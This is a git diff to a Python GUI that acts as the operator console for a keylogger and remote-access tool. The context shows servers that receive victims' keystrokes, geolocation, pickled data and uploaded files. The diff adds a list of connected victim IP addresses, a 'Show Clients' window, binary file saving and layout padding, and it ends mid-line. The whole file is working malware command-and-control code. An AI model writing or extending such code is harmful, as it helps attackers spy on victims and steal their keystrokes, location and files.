@@ -9,7 +9,8 @@ import pickle
 
 
 class App(customtkinter.CTk):
-    SERVER_SOCKETS= [] 
+    SERVER_SOCKETS= []
+    CLIENT_IP= []
     USER_GEOLOCATIONS= []
 
     def __init__(self):
@@ -48,20 +49,23 @@ class App(customtkinter.CTk):
         self.frame1 = customtkinter.CTkFrame(master=self,
                                width=200,
                                height=500)
-        self.frame1.grid(row=0, column=0, sticky="w")
+        self.frame1.grid(row=0, column=0, sticky="w", padx=10)
         
         # Buttons
         self.button = customtkinter.CTkButton(master=self.frame1, text="Killswitch", command=lambda: self.killswitch(self.SERVER_SOCKETS[0]))
-        self.button.grid(row=0, column=0, pady =10,sticky="n")
+        self.button.grid(row=0, column=0, pady =10,sticky="n", padx=10)
       
         self.button = customtkinter.CTkButton(master=self.frame1, command=self.startPortScan, text="Port Scan")
-        self.button.grid(row=1, column=0, pady =10,sticky="n")
+        self.button.grid(row=1, column=0, pady =10,sticky="n", padx=10)
 
         self.button = customtkinter.CTkButton(master=self.frame1, command=self.openMapLevel,text="Geolocation")
-        self.button.grid(row=2, column=0, pady =10,sticky="n")     
+        self.button.grid(row=2, column=0, pady =10,sticky="n", padx=10)     
 
         self.button = customtkinter.CTkButton(master=self.frame1, command=self.showFiles,text="Files")
-        self.button.grid(row=3, column=0, pady =10, sticky="n")
+        self.button.grid(row=3, column=0, pady =10, sticky="n", padx=10)
+
+        self.button = customtkinter.CTkButton(master=self.frame1, command=lambda: self.showClientList(self.CLIENT_IP), text="Show Clients")
+        self.button.grid(row=4,column=0,pady=10,sticky="n", padx=10)
         
         #! Center Frame: Main content/command line
         self.frame2 = customtkinter.CTkFrame(master=self,
@@ -101,6 +105,7 @@ class App(customtkinter.CTk):
                 print("KEYLOGGER: Listening for Keylog clients.")
                 s.listen()
                 conn, addr = s.accept()
+                self.CLIENT_IP.append(addr)
                 with conn:
                     print(f"KEYLOGGER: Connected by {addr}")
                     # Recieve geo data before key logging
@@ -130,7 +135,7 @@ class App(customtkinter.CTk):
                 print("DICT_TRANSFER: Listening for clients.")
                 s.listen()
                 conn, addr = s.accept()
-                
+                self.CLIENT_IP.append(addr)
                 # Accept the pickle list and print it
                 with conn:
                     print(f"DICT_TRANSFER: Connected by {addr}")
@@ -153,7 +158,7 @@ class App(customtkinter.CTk):
                 s.listen()
                 while True:
                     conn, addr = s.accept()
-
+                    self.CLIENT_IP.append(addr)
                     while True:
                         msg = conn.recv(64).decode("utf-8")
                         if msg:
@@ -162,10 +167,11 @@ class App(customtkinter.CTk):
                             match cmd:
                                 case "FILENAME":
                                     print(f"\nCreated file: {msg}")
-                                    new_file = open(f"{data}", "w")
+                                    new_file = open(f"{data}", "wb")
                                     msg = ""
 
                                 case "DATA":
+                                    print(data)
                                     print(f"\nWriting to file: {msg}")
                                     new_file.write(data)
                                     msg = ""
@@ -275,7 +281,20 @@ class App(customtkinter.CTk):
         geoThread = threading.Thread(target=create_geoTopLevel)
         geoThread.daemon = True
         geoThread.start()
-        
+
+    def showClientList(self, client_list: list):
+        window = customtkinter.CTkToplevel(self)
+        window.geometry("600x400")
+        window.title("Client List")
+
+        ctext_box = tkinter.Listbox(window, width=65, height=25, background='#2A2E2E',
+                                    borderwidth=0,highlightthickness=0, foreground='#FFFFFF', selectbackground='#696969',
+                                     font=("Trajan Pro", "14"))
+        ctext_box.pack(side=tkinter.LEFT, padx=10, pady=10)
+
+        for client in client_list:
+            ctext_box.insert(0, f"{client[0]}:{client[1]}")
+            ctext_box.selec
     
 # Run dze up
 app = App()
